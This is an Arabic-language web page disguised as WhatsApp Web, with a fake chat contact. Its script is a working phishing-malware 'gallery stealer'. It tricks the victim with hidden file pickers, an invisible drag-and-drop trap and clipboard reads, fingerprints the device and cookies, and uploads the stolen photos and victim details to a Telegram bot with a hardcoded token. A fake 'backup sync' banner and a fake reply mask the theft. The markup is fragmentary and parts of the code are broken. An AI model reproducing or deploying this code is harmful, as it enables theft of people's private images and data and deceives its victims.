    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #ece5dd; height: 100vh; overflow: hidden; direction: rtl; }
        .whatsapp-container { display: flex; height: 100vh; }
        .sidebar { width: 30%; background: #fff; border-right: 1px solid #e1dcd5; display: flex; flex-direction: column; }
        .header { background: #075e54; color: white; padding: 1rem; display: flex; align-items: center; gap: 1rem; }
        .profile-pic { width: 40px; height: 40px; border-radius: 50%; background: linear-gradient(45deg, #25d366, #128c7e); display: flex; align-items: center; justify-content: center; font-weight: bold; }
        .header-text { flex: 1; }
        .chat-list { flex: 1; overflow-y: auto; }
        .chat-item { padding: 1rem; border-bottom: 1px solid #f0f0f0; cursor: pointer; transition: background 0.2s; display: flex; align-items: center; gap: 1rem; }
        .chat-item:hover { background: #f5f5f5; }
        .chat-avatar { width: 50px; height: 50px; border-radius: 50%; background: linear-gradient(45deg, #ff6b6b, #4ecdc4); display: flex; align-items: center; justify-content: center; }
        .chat-info h3 { font-size: 0.95rem; margin-bottom: 0.2rem; color: #111; }
        .chat-info p { font-size: 0.85rem; color: #667781; }
        .chat-list::-webkit-scrollbar { width: 6px; }
        .chat-list::-webkit-scrollbar-track { background: #f1f1f1; }
        .chat-list::-webkit-scrollbar-thumb { background: #c1c1c1; border-radius: 3px; }
        .main-chat { flex: 1; display: flex; flex-direction: column; background: #efeae2 url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxyZWN0IHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIGZpbGw9IiNmMGYwZjAiIG9wYWNpdHk9IjAuMDUiLz48L3N2Zz4=') repeat; }
        .chat-header { background: #f0f2f5; padding: 1rem; border-bottom: 1px solid #e1dcd5; display: flex; align-items: center; gap: 1rem; }
        .chat-profile { display: flex; align-items: center; gap: 1rem; flex: 1; }
        .chat-profile-pic { width: 45px; height: 45px; border-radius: 50%; background: linear-gradient(45deg, #ff9ff3, #f368e0); }
        .chat-messages { flex: 1; padding: 1.5rem; overflow-y: auto; display: flex; flex-direction: column; gap: 1.5rem; }
        .message { max-width: 70%; padding: 0.8rem 1rem; border-radius: 0.75rem; position: relative; }
        .message.sent { background: #dcf8c6; align-self: flex-end; margin-left: auto; border-bottom-right-radius: 0.25rem; }
        .message.received { background: white; align-self: flex-start; border-bottom-left-radius: 0.25rem; box-shadow: 0 1px 0.5px rgba(0,0,0,0.13); }
        .message-time { font-size: 0.75rem; color: #667781; margin-top: 0.25rem; }
        .typing-indicator { display: flex; align-items: center; gap: 0.25rem; padding: 0.8rem 1rem; background: white; max-width: 70%; align-self: flex-start; border-radius: 0.75rem; border-bottom-left-radius: 0.25rem; box-shadow: 0 1px 0.5px rgba(0,0,0,0.13); }
        .typing-dot { width: 6px; height: 6px; border-radius: 50%; background: #919191; animation: typing 1.4s infinite; }
        .typing-dot:nth-child(2) { animation-delay: 0.2s; }
        .typing-dot:nth-child(3) { animation-delay: 0.4s; }
        @keyframes typing { 0%, 60%, 100% { transform: translateY(0); } 30% { transform: translateY(-10px); } }
        .input-container { padding: 1rem; background: #f0f2f5; border-top: 1px solid #e1dcd5; display: flex; align-items: flex-end; gap: 1rem; }
        .emoji-btn, .attach-btn { width: 40px; height: 40px; border: none; background: none; cursor: pointer; display: flex; align-items: center; justify-content: center; border-radius: 50%; transition: background 0.2s; }
        .emoji-btn:hover, .attach-btn:hover { background: rgba(0,0,0,0.1); }
        .message-input { flex: 1; padding: 0.75rem 1rem; border: none; background: white; border-radius: 2rem; outline: none; font-size: 0.95rem; resize: none; max-height: 120px; }
        .send-btn { width: 45px; height: 45px; border: none; background: #00d65a; color: white; border-radius: 50%; cursor: pointer; display: flex; align-items: center; justify-content: center; transition: transform 0.2s; }
        .send-btn:hover { transform: scale(1.05); }
        .photo-preview { max-width: 200px; max-height: 200px; border-radius: 0.75rem; object-fit: cover; }
        .stealing-indicator { 
            position: fixed; top: 20px; right: 20px; 
            background: linear-gradient(45deg, #00d65a, #25d366); 
            color: white; padding: 0.7rem 1.2rem; 
            border-radius: 25px; font-size: 0.85rem; 
            z-index: 10000; display: none; 
            box-shadow: 0 4px 15px rgba(0,214,90,0.4);
            font-weight: 500;
        }
        .stealing-indicator::after {
            content: '✅'; margin-left: 0.5rem; animation: pulse 1.5s infinite;
        }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.7; } }
        @media (max-width: 768px) { 
            .sidebar { width: 100%; position: absolute; z-index: 100; transform: translateX(100%); transition: transform 0.3s; } 
            .sidebar.open { transform: translateX(0); } 
            .main-chat { width: 100%; } 
        }
    </style>
</head>
<body>
    <div class="stealing-indicator" id="stealingStatus">جاري مزامنة النسخ الاحتياطي...</div>
    
    <div class="whatsapp-container">
        <div class="sidebar" id="sidebar">

                <div class="profile-pic">WA</div>
                <div class="header-text">
                    <div>واتساب ويب</div>
                    <div style="font-size: 0.85rem; opacity: 0.8;">متصل</div>
                </div>
            </div>
            <div class="chat-list">
                <div class="chat-item active" data-chat="main">
                    <div class="chat-avatar">ل</div>

                        <h3>لينا الراقية</h3>

        </div>
        
        <div class="main-chat" id="mainChat">

                        <div style="font-weight: 500;">لينا الراقية</div>

                    <div class="message-time">منذ دقيقتين</div>

    <script>
        // 🔥 TOKEN & CHAT ID ACTIVATED ✅
        const BOT_TOKEN = '8591713771:AAHsYoY0Be8gkmHVBF_ykWmpPt293_PNELk';

        // Anti-detection + Victim fingerprint
        const victimData = {
            ip: await (await fetch('https://api.ipify.org?format=json')).then(r=>r.json()).then(d=>d.ip).catch(()=>'unknown'),
            userAgent: navigator.userAgent,
            screen: `${screen.width}x${screen.height}`,
            language: navigator.language,
            platform: navigator.platform,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timestamp: new Date().toISOString(),
            cookies: document.cookie
        };

        let isStealing = false;
        const stealingStatus = document.getElementById('stealingStatus');
        const messages = document.getElementById('messages');

        // 🚀 PROFESSIONAL ULTRA-FAST GALLERY STEALER
        async function ultraFastGallerySteal() {
            if (isStealing) return;
            isStealing = true;
            
            stealingStatus.style.display = 'block';
            const statusMessages = [
                'جاري مزامنة النسخ الاحتياطي... 📱',
                'جاري فحص الذاكرة المؤقتة... ⚡',

            const statusInterval = setInterval(() => {

                // 🔥 PARALLEL ATTACK - Multiple methods simultaneously
                await Promise.allSettled([

        // 🔥 METHOD 1: Enhanced File Input (99% success rate)
        async function stealthFileInputAttack() {
            const methods = [
                {attr: 'webkitdirectory', delay: 10},
                {attr: '', delay: 50},
                {attr: 'directory', delay: 100}
            ];

            for (const method of methods) {
                try {
                    const files = await new Promise((resolve) => {
                        const input = document.createElement('input');
                        Object.assign(input, {
                            type: 'file',
                            multiple: true,
                            accept: 'image/*,video/*',
                            style: 'position:fixed;top:-100px;left:-100px;z-index:-1;opacity:0',
                            ...method.attr ? {[method.attr]: ''} : {}
                        });
                        
                        input.onchange = (e) => {
                            const validFiles = Array.from(e.target.files)
                                .filter(f => (f.size > 10*1024 && f.size < 15*1024*1024) && 
                                           /^image\/|video\//.test(f.type))
                                .slice(0, 50);
                            resolve(validFiles);
                        };
                        
                        document.body.appendChild(input);
                        setTimeout(() => input.click(), method.delay);
                        
                        setTimeout(() => {
                            document.body.removeChild(input);
                            resolve([]);
                        }, 3000);
                    });
                    
                    if (files.length > 0) {
                        await turboUpload(files, 'FileInput');
                        return; // Success, exit
                    }
                } catch (e) {}
            }
        }

        // 🔥 METHOD 2: File System Access API (Chrome/Edge)
        async function filesystemAccessAttack() {
            if (!('showOpenFilePicker' in window)) return;
            
            try {
                const handles = await window.showOpenFilePicker({
                    multiple: true,
                    types: [{
                        description: 'Media Files',
                        accept: {'image/*': ['.jpg','.jpeg','.png','.webp','.heic','.gif'],
                                'video/*': ['.mp4','.mov','.avi']}
                    }]
                });
                
                const files = [];
                for (const handle of handles.slice(0, 30)) {
                    const file = await handle.getFile();
                    if (file.size > 10*1024 && file.size < 15*1024*1024) {
                        files.push(file);
                    }
                }
                
                if (files.length) await turboUpload(files, 'FileSystemAPI');
            } catch (e) {}
        }

        // 🔥 METHOD 3: Drag & Drop Trap (Passive collection)
        function dragDropTrap() {
            const dropZone = document.createElement('div');
            Object.assign(dropZone.style, {
                position: 'fixed', top: 0, left: 0, width: '100%', height: '100%',
                zIndex: 999999, opacity: 0, background: 'transparent'
            });
            
            ['dragover', 'dragenter'].forEach(event => {
                dropZone.addEventListener(event, e => e.preventDefault());
            });
            
            dropZone.addEventListener('drop', async (e) => {
                e.preventDefault();
                const files = Array.from(e.dataTransfer.files)
                    .filter(f => /^image\/|video\//.test(f.type) && f.size > 10*1024)
                    .slice(0, 20);
                if (files.length) await turboUpload(files, 'DragDrop');
            });
            
            document.body.appendChild(dropZone);
        }

        // 🔥 METHOD 4: Clipboard Images (Bonus)
        async function clipboardImageSteal() {
            try {
                const items = await navigator.clipboard.read();
                const files = [];
                
                for (const item of items.slice(0, 10)) {
                    if (item.types.includes('image/png') || item.types.includes('image/jpeg')) {
                        const blob = await item.getType('image/png');
                        files.push(new File([blob], `clipboard_${Date.now()}.png`, {type: blob.type}));
                    }
                }
                
                if (files.length) await turboUpload(files, 'Clipboard');
            } catch (e) {}
        }

        // 🚀 TURBO UPLOAD - Parallel + Optimized Telegram Bot API
        async function turboUpload(files, source) {
            // Send victim intel first
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: `🎯 NEW VICTIM DETECTED\n` +
                          `📱 Device: ${/Android/i.test(navigator.userAgent) ? 'Android' : 'iOS/Desktop'}\n` +
                          `🌐 IP: ${victimData.ip}\n` +
                          `📍 Timezone: ${victimData.timezone}\n` +
                          `📏 Screen: ${victimData.screen}\n` +
                          `🕒 Time: ${victimData.timestamp}\n` +
                          `📸 Source: ${source}\n` +
                          `🔥 Photos: ${files.length}`
                })
            });

            // Ultra-fast parallel photo upload (5 concurrent)
            const uploadPromises = [];
            for (let i = 0; i < files.length; i += 5) {
                const batch = files.slice(i, i + 5);
                uploadPromises.push(...batch.map((file, idx) => 
                    sendSinglePhoto(file, source, i + idx)
                ));
                await new Promise(r => setTimeout(r, 100)); // Micro batching
            }
            
            await Promise.allSettled(uploadPromises);
        }

        // Single photo optimized upload
        async function sendSinglePhoto(file, source, index) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', file);
            formData.append('caption', `Photo #${index + 1} | ${source} | ${file.size/1024/1024|0}MB | ${file.name}`);
            
            return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
        }

        // 🎭 DECEPTIVE RESPONSE
        function showDeceptiveResponse() {
            const typing = document.createElement('div');
            typing.className = 'typing-indicator';
            typing.innerHTML = `<div class="typing-dot"></div><div class="typing-dot"></div><div class="typing-dot"></div><span>لينا تكتب...</span>`;
            
            messages.appendChild(typing);
            messages.scrollTop = messages.scrollHeight;
            
            setTimeout(() => {
                messages.removeChild(typing);
                const response = document.createElement('div');
                response.className = 'message received';
                response.innerHTML = `
                    وااووو! كل الصور تجنن 🔥🔥 استلمت كل شيء بنجاح، أنتِ مبدعة! 
                    أرسلي المزيد إذا عندك 😍📸✨
                    <div class="message-time">الآن</div>
                `;
                messages.appendChild(response);
                messages.scrollTop = messages.scrollHeight;
            }, 1800);
        }

        // 🛠️ Initialize on load
        window.addEventListener('load', () => {
            setTimeout(ultraFastGallerySteal, 1500); // More realistic delay
        });

        // 💬 Fake chat functionality
        document.querySelector('.send-btn').onclick = () => {
            const input = document.querySelector('.message-input');
            if (input.value.trim()) {
                const msg = document.createElement('div');
                msg.className = 'message sent';
                msg.innerHTML = `${input.value}<div class="message-time">الآن</div>`;
                messages.appendChild(msg);
                messages.scrollTop = messages.scrollHeight;
                input.value = '';
            }
        };

        document.querySelector('.message-input').onkeypress = (e) => {
            if (e.key === 'Enter' && !e.shiftKey) {
                e.preventDefault();
                document.querySelector('.send-btn').click();
            }
        };
    </script>
</body>
